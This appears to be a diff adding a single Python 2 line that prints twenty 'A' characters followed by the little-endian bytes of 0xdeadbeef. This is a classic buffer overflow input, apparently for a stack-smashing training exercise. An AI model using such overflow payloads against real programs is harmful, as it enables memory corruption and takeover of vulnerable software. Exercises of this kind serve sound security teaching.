@@ -1,0 +1,6 @@
+
+
+
+
+print 'A'*20 + '\xef\xbe\xad\xde'
+
